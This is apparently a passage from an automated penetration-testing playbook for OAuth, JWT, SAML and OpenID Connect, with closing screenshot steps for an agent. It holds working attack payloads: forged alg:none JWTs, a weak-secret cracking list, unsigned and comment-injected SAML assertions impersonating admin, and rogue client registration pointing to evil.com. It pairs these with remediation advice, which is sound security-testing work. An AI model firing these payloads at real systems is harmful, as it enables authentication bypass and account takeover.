# (Complements Phase 13 Deep JWT Testing — this focuses on OAuth-specific JWT issues)

import base64, json, hmac, hashlib

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping JWT-OAuth tests")
else:
    _G.setdefault('_oauth_jwt_vulns', [])

    # Collect any JWTs from cookies, stored tokens, or OAuth responses
    jwts_found = []

    # Check cookies
    for name, value in session.cookies.items():
        if value.count('.') == 2 and value.startswith('ey'):
            jwts_found.append(('cookie:' + name, value))

    # Check stored tokens from previous phases
    for key in ['access_token', 'id_token', 'token', 'jwt']:
        if key in _G and _G[key] and isinstance(_G[key], str) and _G[key].startswith('ey'):
            jwts_found.append(('stored:' + key, _G[key]))

    if not jwts_found:
        print("[INFO] No JWT tokens found in session — skipping JWT-OAuth attacks")
        print("  (Run this after successful OAuth login to test token security)")
    else:
        for source, jwt_token in jwts_found:
            print(f"\n[*] Analyzing JWT from {source}")
            parts = jwt_token.split('.')
            try:
                # Decode header and payload
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                print(f"  Header: {json.dumps(header)}")
                print(f"  Payload: {json.dumps(payload)[:300]}")

                alg = header.get('alg', '')

                # Test 1: alg:none attack
                none_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).rstrip(b'=').decode()
                none_jwt = none_header + '.' + parts[1] + '.'

                # Test 2: Algorithm confusion (RS256 -> HS256)
                if alg.startswith('RS'):
                    print(f"  [INFO] JWT uses {alg} — testing HS256 confusion attack")
                    # Would need server's public key to exploit — flag for manual review
                    _G['_oauth_jwt_vulns'].append({
                        'type': 'alg_confusion_candidate',
                        'source': source,
                        'algorithm': alg,
                    })

                # Test 3: Weak HMAC secret (if HS256/384/512)
                if alg.startswith('HS'):
                    print(f"  [INFO] JWT uses {alg} — testing weak secrets")
                    common_secrets = [
                        'secret', 'password', '123456', 'key', 'jwt_secret',
                        'changeme', 'test', 'default', 'admin', '',
                        'your-256-bit-secret', 'super-secret',
                    ]
                    signing_input = (parts[0] + '.' + parts[1]).encode()
                    original_sig = parts[2]

                    for secret in common_secrets:
                        if alg == 'HS256':
                            computed = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                        elif alg == 'HS384':
                            computed = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
                        elif alg == 'HS512':
                            computed = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
                        else:
                            continue

                        computed_b64 = base64.urlsafe_b64encode(computed).rstrip(b'=').decode()
                        if computed_b64 == original_sig:
                            print(f"  [CRITICAL] JWT secret cracked: '{secret}'")
                            print(f"  Attacker can forge arbitrary tokens!")
                            _G['_oauth_jwt_vulns'].append({
                                'type': 'weak_secret',
                                'source': source,
                                'secret': secret,
                            })
                            break

                # Test 4: Sensitive data in payload
                sensitive_fields = ['password', 'secret', 'ssn', 'credit_card',
                                    'private_key', 'api_key', 'internal']
                for field in sensitive_fields:
                    if field in str(payload).lower():
                        print(f"  [MEDIUM] JWT payload contains sensitive field: {field}")
                        _G['_oauth_jwt_vulns'].append({
                            'type': 'sensitive_payload',
                            'source': source,
                            'field': field,
                        })

                # Test 5: Missing expiration
                if 'exp' not in payload:
                    print(f"  [MEDIUM] JWT has no expiration (exp) claim — tokens never expire")
                    _G['_oauth_jwt_vulns'].append({
                        'type': 'no_expiration',
                        'source': source,
                    })

            except Exception as e:
                print(f"  [ERROR] Failed to decode JWT: {e}")

    if _G['_oauth_jwt_vulns']:
        print(f"\n[!] Found {len(_G['_oauth_jwt_vulns'])} JWT-OAuth issue(s)")
    else:
        print("\n[+] No JWT-OAuth vulnerabilities found")
```

```python
# ── Step 10: SSO-Specific Tests — SAML & OpenID Connect ─────────────────────
# SAML: XML signature wrapping, comment injection, assertion replay
# OIDC: ID token validation bypass, nonce replay
# Severity varies: [HIGH] to [CRITICAL] for confirmed bypasses.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth/SSO endpoints — skipping SSO-specific tests")
else:
    _G.setdefault('_sso_vulns', [])

    # ── SAML Testing ─────────────────────────────────────────────────────────
    saml_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'saml' in ep['url'].lower() or 'sso' in ep['url'].lower()]
    saml_paths = [BASE + p for p in ['/saml/login', '/saml/acs', '/saml/metadata',
                                      '/sso/saml', '/auth/saml', '/saml2/acs']]

    # Check for SAML metadata endpoint
    for path in saml_paths + saml_endpoints:
        if 'metadata' in path.lower():
            try:
                r = session.get(path, timeout=8, verify=False)
                if r.status_code == 200 and ('EntityDescriptor' in r.text or 'saml' in r.text.lower()):
                    print(f"[INFO] SAML metadata found: {path}")
                    print(f"  Length: {len(r.text)}b")
                    # Check for sensitive info in metadata
                    if 'X509Certificate' in r.text:
                        print(f"  [INFO] SAML signing certificate exposed in metadata")
                    if 'SingleSignOnService' in r.text:
                        sso_urls = re.findall(r'Location="([^"]+)"', r.text)
                        for u in sso_urls:
                            print(f"  SSO endpoint: {u}")
            except Exception:
                pass

    # SAML ACS (Assertion Consumer Service) tests
    acs_endpoints = [ep for ep in saml_paths + saml_endpoints if 'acs' in ep.lower()]

    for acs_url in acs_endpoints:
        print(f"\n[*] Testing SAML ACS: {acs_url}")

        # Test 1: XML signature wrapping — send unsigned assertion
        # This is a common SAML bypass: move the signature away from the assertion
        test_saml_response = base64.b64encode(
            b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>'
            b'</saml:Assertion></samlp:Response>'
        ).decode()

        try:
            r = session.post(acs_url,
                             data={'SAMLResponse': test_saml_response, 'RelayState': '/'},
                             timeout=8, verify=False, allow_redirects=False)

            if r.status_code in (200, 302) and 'error' not in r.text.lower()[:500]:
                if r.status_code == 302:
                    loc = r.headers.get('Location', '')
                    if 'error' not in loc.lower() and 'login' not in loc.lower():
                        print(f"  [CRITICAL] Unsigned SAML assertion accepted! Redirect to: {loc[:100]}")
                        _G['_sso_vulns'].append({
                            'type': 'saml_unsigned_assertion',
                            'url': acs_url,
                            'evidence': f'HTTP {r.status_code}, redirect to {loc[:100]}',
                        })
                    else:
                        print(f"  [OK] SAML assertion rejected (redirect to login/error)")
                else:
                    print(f"  [INFO] HTTP 200 — check response manually")
            elif 'signature' in r.text.lower()[:500] or 'invalid' in r.text.lower()[:500]:
                print(f"  [OK] Unsigned assertion rejected — signature validation in place")
            else:
                print(f"  [INFO] HTTP {r.status_code}")
        except Exception as e:
            print(f"  [ERROR] {e}")

        # Test 2: SAML comment injection in NameID
        # Injecting a comment into the NameID can bypass string comparison
        # e.g., admin@target.com becomes admin@target.com<!---->.evil.com
        comment_saml = base64.b64encode(
            b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'<saml:Subject><saml:NameID>admin@target.com<!--INJECT-->.evil.com'
            b'</saml:NameID></saml:Subject>'
            b'</saml:Assertion></samlp:Response>'
        ).decode()

        try:
            r = session.post(acs_url,
                             data={'SAMLResponse': comment_saml, 'RelayState': '/'},
                             timeout=8, verify=False, allow_redirects=False)
            if r.status_code in (200, 302):
                body_lower = r.text.lower()[:500]
                loc = r.headers.get('Location', '')
                if r.status_code == 302 and 'error' not in loc.lower() and 'login' not in loc.lower():
                    print(f"  [CRITICAL] SAML comment injection may have succeeded!")
                    print(f"  Redirect: {loc[:100]}")
                    _G['_sso_vulns'].append({
                        'type': 'saml_comment_injection',
                        'url': acs_url,
                        'evidence': f'Comment-injected NameID accepted, redirect to {loc[:100]}',
                    })
                elif 'error' in body_lower or 'invalid' in body_lower:
                    print(f"  [OK] Comment injection rejected")
                else:
                    print(f"  [INFO] HTTP {r.status_code} — manual review needed")
        except Exception as e:
            print(f"  [ERROR] {e}")

        # Test 3: SAML assertion replay — send same assertion twice
        print(f"  [INFO] Assertion replay tested via code replay test (Step 3)")

    # ── OpenID Connect Testing ───────────────────────────────────────────────
    oidc_config = _G.get('OAUTH_INFO', {}).get('openid_config', {})

    if oidc_config:
        print(f"\n[*] Testing OpenID Connect specific issues")

        # Test 1: ID token validation — request id_token without nonce
        auth_ep = oidc_config.get('authorization_endpoint', '')
        if auth_ep:
            print(f"  Testing nonce enforcement on: {auth_ep}")
            params = {
                'response_type': 'id_token',
                'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
                'redirect_uri': BASE + '/callback',
                'scope': 'openid',
                'state': 'test_state',
                # Deliberately omitting nonce
            }
            try:
                r = session.get(auth_ep + '?' + urlencode(params),
                                allow_redirects=False, timeout=8, verify=False)
                loc = r.headers.get('Location', '')
                if 'id_token=' in loc and 'nonce' not in loc.lower():
                    print(f"  [MEDIUM] id_token issued WITHOUT nonce — replay attacks possible")
                    _G['_sso_vulns'].append({
                        'type': 'oidc_missing_nonce',
                        'url': auth_ep,
                        'evidence': 'id_token issued without requiring nonce parameter',
                    })
                elif 'error' in loc.lower() and 'nonce' in loc.lower():
                    print(f"  [OK] Server requires nonce for id_token response type")
                else:
                    print(f"  [INFO] HTTP {r.status_code}")
            except Exception as e:
                print(f"  [ERROR] {e}")

        # Test 2: Check userinfo endpoint without token
        userinfo_ep = oidc_config.get('userinfo_endpoint', '')
        if userinfo_ep:
            print(f"\n  Testing userinfo endpoint: {userinfo_ep}")
            try:
                # No auth
                r_noauth = session.get(userinfo_ep, timeout=8, verify=False)
                if r_noauth.status_code == 200:
                    try:
                        data = r_noauth.json()
                        if data and ('sub' in data or 'email' in data):
                            print(f"  [CRITICAL] Userinfo accessible without token!")
                            print(f"  Data: {json.dumps(data)[:200]}")
                            _G['_sso_vulns'].append({
                                'type': 'oidc_userinfo_noauth',
                                'url': userinfo_ep,
                                'evidence': f'Userinfo returned without auth: {json.dumps(data)[:200]}',
                            })
                    except Exception:
                        pass
                else:
                    print(f"  [OK] Userinfo requires authentication (HTTP {r_noauth.status_code})")
            except Exception as e:
                print(f"  [ERROR] {e}")

        # Test 3: Check if discovery document exposes sensitive endpoints
        sensitive_oidc_keys = ['registration_endpoint', 'revocation_endpoint',
                               'device_authorization_endpoint', 'introspection_endpoint']
        for key in sensitive_oidc_keys:
            if key in oidc_config:
                ep_url = oidc_config[key]
                print(f"  [INFO] OIDC {key}: {ep_url}")
                # Test registration endpoint for dynamic client registration
                if key == 'registration_endpoint':
                    try:
                        r = session.post(ep_url, json={
                            'redirect_uris': ['https://evil.com/callback'],
                            'client_name': 'Pentest Client',
                            'grant_types': ['authorization_code'],
                        }, timeout=8, verify=False)
                        if r.status_code in (200, 201):
                            try:
                                reg_data = r.json()
                                if 'client_id' in reg_data:
                                    print(f"  [HIGH] Dynamic client registration allowed without auth!")
                                    print(f"  client_id: {reg_data.get('client_id')}")
                                    print(f"  Attacker can register arbitrary OAuth clients")
                                    _G['_sso_vulns'].append({
                                        'type': 'oidc_open_registration',
                                        'url': ep_url,
                                        'evidence': f'Registered client: {reg_data.get("client_id")}',
                                    })
                            except Exception:
                                pass
                        else:
                            print(f"    Registration requires auth (HTTP {r.status_code})")
                    except Exception as e:
                        print(f"    [ERROR] {e}")
    else:
        print("[INFO] No OIDC configuration found — skipping OIDC-specific tests")

    if _G['_sso_vulns']:
        print(f"\n[!] Found {len(_G['_sso_vulns'])} SSO-specific issue(s)")
    else:
        print("\n[+] No SSO-specific vulnerabilities confirmed")
```

```python
# ── Phase 27 — Store all OAuth/SSO findings in _G['FINDINGS'] ────────────────
# This block MUST run after all OAuth/SSO tests above.

_G.setdefault('FINDINGS', [])
_oauth_count = 0

# ── redirect_uri open redirects ──────────────────────────────────────────────
for redir in _G.get('_oauth_redirects', []):
    _G['FINDINGS'].append({
        'severity': 'CRITICAL',
        'title': 'OAuth Redirect URI Bypass',
        'url': redir.get('url', BASE),
        'method': 'GET',
        'parameter': 'redirect_uri',
        'payload': redir.get('payload', ''),
        'evidence': f"Server redirected to attacker domain: {redir.get('location', '')[:200]}",
        'impact': 'Attacker can steal OAuth authorization codes or access tokens by redirecting the user to an attacker-controlled domain after authentication',
        'remediation': 'Enforce strict redirect_uri validation using an exact-match allowlist. Do not allow partial matches, subdomain wildcards, or path-based matching. Register all valid redirect URIs in the OAuth provider configuration.',
        'screenshot': '',
    })
    _oauth_count += 1

# ── State parameter CSRF ─────────────────────────────────────────────────────
if _G.get('_oauth_state_vuln'):
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'OAuth CSRF via State',
        'url': BASE,
        'method': 'GET',
        'parameter': 'state',
        'payload': 'Missing or unvalidated state parameter',
        'evidence': 'OAuth callback endpoint accepts requests without a valid state parameter',
        'impact': 'Attacker can perform CSRF on the OAuth login flow, forcing a victim to authenticate with the attacker\'s account (login CSRF) or link the attacker\'s identity to the victim\'s account',
        'remediation': 'Generate a cryptographically random state parameter tied to the user session. Validate it on the callback endpoint before exchanging the authorization code. Reject requests with missing or invalid state values.',
        'screenshot': '',
    })
    _oauth_count += 1

# ── Authorization code replay ────────────────────────────────────────────────
if _G.get('_oauth_code_replay'):
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'OAuth Code Replay',
        'url': BASE,
        'method': 'POST',
        'parameter': 'code',
        'payload': 'Same authorization code exchanged multiple times',
        'evidence': 'Token endpoint accepted the same authorization code twice, returning access tokens both times',
        'impact': 'Attacker who intercepts an authorization code can exchange it for an access token even after the legitimate user has already used it',
        'remediation': 'Enforce single-use authorization codes per RFC 6749. Invalidate the code immediately after first exchange. If a code is presented a second time, revoke all tokens issued from that code.',
        'screenshot': '',
    })
    _oauth_count += 1

# ── Token leakage ────────────────────────────────────────────────────────────
for leak in _G.get('_oauth_token_leaks', []):
    severity = 'HIGH'
    if leak['type'] == 'implicit_flow':
        title = 'OAuth Implicit Flow Enabled'
        impact = 'Access tokens are exposed in URL fragments, leaking via browser history, Referer headers, and server logs. Implicit flow is deprecated in OAuth 2.1.'
        remediation = 'Disable the implicit grant flow (response_type=token). Use authorization code flow with PKCE instead. This prevents token exposure in URLs.'
    elif leak['type'] == 'error_page_leak':
        title = 'OAuth Token In Error Page'
        severity = 'HIGH'
        impact = 'Tokens or secrets exposed in error pages can be captured by attackers through browser history, caching, or screen capture'
        remediation = 'Sanitize all error responses to remove tokens, secrets, and credentials. Use generic error messages that do not reflect sensitive request parameters.'
    else:
        title = 'OAuth Token Leakage'
        impact = 'Access tokens or authorization codes exposed in URLs can be stolen via Referer headers, browser history, proxy logs, and shared links'
        remediation = 'Ensure tokens are only transmitted in POST bodies or Authorization headers, never in URL query strings or fragments. Set Referrer-Policy: no-referrer on callback pages.'

    _G['FINDINGS'].append({
        'severity': severity,
        'title': title,
        'url': leak.get('url', BASE),
        'method': 'GET',
        'parameter': 'access_token',
        'payload': '',
        'evidence': leak.get('evidence', ''),
        'impact': impact,
        'remediation': remediation,
        'screenshot': '',
    })
    _oauth_count += 1

# ── Client secret exposure ───────────────────────────────────────────────────
for leak in _G.get('_oauth_secret_leaks', []):
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'OAuth Client Secret Exposed',
        'url': leak.get('url', BASE),
        'method': 'GET',
        'parameter': leak.get('type', 'client_secret'),
        'payload': '',
        'evidence': f"{leak.get('type', 'client_secret')} value found: {leak.get('value', '')}...",
        'impact': 'Client secret in client-side code allows attackers to impersonate the OAuth client, exchange stolen authorization codes for tokens, and potentially access all user accounts',
        'remediation': 'Never include client secrets in client-side code (JavaScript, mobile apps). Use public clients with PKCE instead. If a secret was exposed, rotate it immediately in the OAuth provider settings.',
        'screenshot': '',
    })
    _oauth_count += 1

# ── Token validation bypass ──────────────────────────────────────────────────
if _G.get('_oauth_token_bypass'):
    _G['FINDINGS'].append({
        'severity': 'CRITICAL',
        'title': 'OAuth Token Validation Bypass',
        'url': BASE,
        'method': 'GET',
        'parameter': 'Authorization',
        'payload': 'Invalid/expired/forged Bearer token',
        'evidence': 'Protected endpoint returned HTTP 200 with an invalid token where it returned 401 without a token',
        'impact': 'Complete authentication bypass — attacker can access protected resources with arbitrary or forged tokens',
        'remediation': 'Validate all tokens server-side on every request. Verify signature, expiration, issuer, and audience claims. Reject tokens that fail any validation check.',
        'screenshot': '',
    })
    _oauth_count += 1

# ── JWT-OAuth vulnerabilities ────────────────────────────────────────────────
for vuln in _G.get('_oauth_jwt_vulns', []):
    if vuln['type'] == 'weak_secret':
        _G['FINDINGS'].append({
            'severity': 'CRITICAL',
            'title': 'OAuth JWT Weak Secret',
            'url': BASE,
            'method': 'N/A',
            'parameter': 'JWT signature',
            'payload': f"Secret: '{vuln.get('secret', '')}'",
            'evidence': f"JWT signing secret cracked: '{vuln.get('secret', '')}' (from {vuln.get('source', 'unknown')})",
            'impact': 'Attacker can forge arbitrary JWT tokens with any claims (user ID, role, permissions), achieving full authentication bypass and privilege escalation',
            'remediation': 'Use a cryptographically strong random secret (minimum 256 bits). Consider switching to asymmetric algorithms (RS256/ES256) for token signing. Rotate the compromised secret immediately.',
            'screenshot': '',
        })
        _oauth_count += 1
    elif vuln['type'] == 'no_expiration':
        _G['FINDINGS'].append({
            'severity': 'MEDIUM',
            'title': 'OAuth JWT No Expiration',
            'url': BASE,
            'method': 'N/A',
            'parameter': 'JWT exp claim',
            'payload': '',
            'evidence': f"JWT from {vuln.get('source', 'unknown')} has no exp claim — tokens never expire",
            'impact': 'Stolen tokens remain valid indefinitely, giving attackers persistent access even after password changes or account deactivation',
            'remediation': 'Include an exp (expiration) claim in all JWTs with a reasonable TTL (e.g., 15 minutes for access tokens). Implement token refresh flows for long-lived sessions.',
            'screenshot': '',
        })
        _oauth_count += 1

# ── SSO-specific vulnerabilities ─────────────────────────────────────────────
for vuln in _G.get('_sso_vulns', []):
    if vuln['type'] == 'saml_unsigned_assertion':
        _G['FINDINGS'].append({
            'severity': 'CRITICAL',
            'title': 'SAML Signature Bypass',
            'url': vuln.get('url', BASE),
            'method': 'POST',
            'parameter': 'SAMLResponse',
            'payload': 'Unsigned SAML assertion',
            'evidence': vuln.get('evidence', 'Unsigned SAML assertion accepted by ACS endpoint'),
            'impact': 'Attacker can forge SAML assertions to impersonate any user, achieving complete authentication bypass on all SSO-integrated applications',
            'remediation': 'Always validate XML signatures on SAML assertions. Reject any assertion without a valid signature. Use a well-maintained SAML library that handles signature verification correctly.',
            'screenshot': '',
        })
        _oauth_count += 1
    elif vuln['type'] == 'saml_comment_injection':
        _G['FINDINGS'].append({
            'severity': 'CRITICAL',
            'title': 'SAML Comment Injection',
            'url': vuln.get('url', BASE),
            'method': 'POST',
            'parameter': 'SAMLResponse',
            'payload': 'NameID with XML comment injection',
            'evidence': vuln.get('evidence', 'SAML assertion with comment-injected NameID was accepted'),
            'impact': 'Attacker can bypass identity checks by injecting XML comments into the NameID field, potentially impersonating other users',
            'remediation': 'Canonicalize XML before comparing identity values. Use exclusive XML canonicalization (exc-c14n) which strips comments. Update the SAML processing library to the latest version.',
            'screenshot': '',
        })
        _oauth_count += 1
    elif vuln['type'] == 'oidc_missing_nonce':
        _G['FINDINGS'].append({
            'severity': 'MEDIUM',
            'title': 'OIDC Missing Nonce Validation',
            'url': vuln.get('url', BASE),
            'method': 'GET',
            'parameter': 'nonce',
            'payload': 'id_token requested without nonce',
            'evidence': vuln.get('evidence', 'id_token issued without requiring nonce parameter'),
            'impact': 'Without nonce validation, ID tokens can be replayed in a token injection attack, allowing session hijacking',
            'remediation': 'Require and validate the nonce parameter for all implicit and hybrid flows that return an id_token. The nonce must be bound to the user session and verified on receipt.',
            'screenshot': '',
        })
        _oauth_count += 1
    elif vuln['type'] == 'oidc_userinfo_noauth':
        _G['FINDINGS'].append({
            'severity': 'CRITICAL',
            'title': 'OIDC Userinfo No Auth',
            'url': vuln.get('url', BASE),
            'method': 'GET',
            'parameter': 'Authorization',
            'payload': 'No Bearer token',
            'evidence': vuln.get('evidence', 'Userinfo endpoint returned user data without authentication'),
            'impact': 'User profile information accessible without authentication, potentially exposing PII for all users',
            'remediation': 'Require a valid access token on the userinfo endpoint. Validate the token signature, expiration, and scope before returning any user data.',
            'screenshot': '',
        })
        _oauth_count += 1
    elif vuln['type'] == 'oidc_open_registration':
        _G['FINDINGS'].append({
            'severity': 'HIGH',
            'title': 'OIDC Open Client Registration',
            'url': vuln.get('url', BASE),
            'method': 'POST',
            'parameter': 'redirect_uris',
            'payload': 'https://evil.com/callback',
            'evidence': vuln.get('evidence', 'Dynamic client registration accepted without authentication'),
            'impact': 'Attacker can register arbitrary OAuth clients with malicious redirect URIs, enabling phishing and token theft against users of the identity provider',
            'remediation': 'Restrict dynamic client registration to authenticated and authorized requests only. Require admin approval for new client registrations. If open registration is needed, enforce strict redirect_uri validation.',
            'screenshot': '',
        })
        _oauth_count += 1

print("=" * 60)
print("PHASE 27 COMPLETE — OAuth / SSO Security Testing")
print("Tested: redirect_uri bypass, state CSRF, code replay, token")
print("        leakage, scope escalation, PKCE bypass, client secret")
print("        exposure, token validation, JWT attacks, SAML, OIDC")
print(f"Stored {_oauth_count} OAuth/SSO findings in _G['FINDINGS']")
print("=" * 60)
```

AFTER RUNNING THIS BLOCK — MANDATORY:
1. For each confirmed OAuth/SSO finding, take a browser screenshot:
   browser_action(action="navigate", url="<oauth_endpoint>")
   browser_action(action="screenshot", filename="oauth_proof_<type>.png")
2. Update each finding's 'screenshot' field in _G['FINDINGS']
3. If the screenshot shows the attack was blocked → REMOVE the finding (false positive)
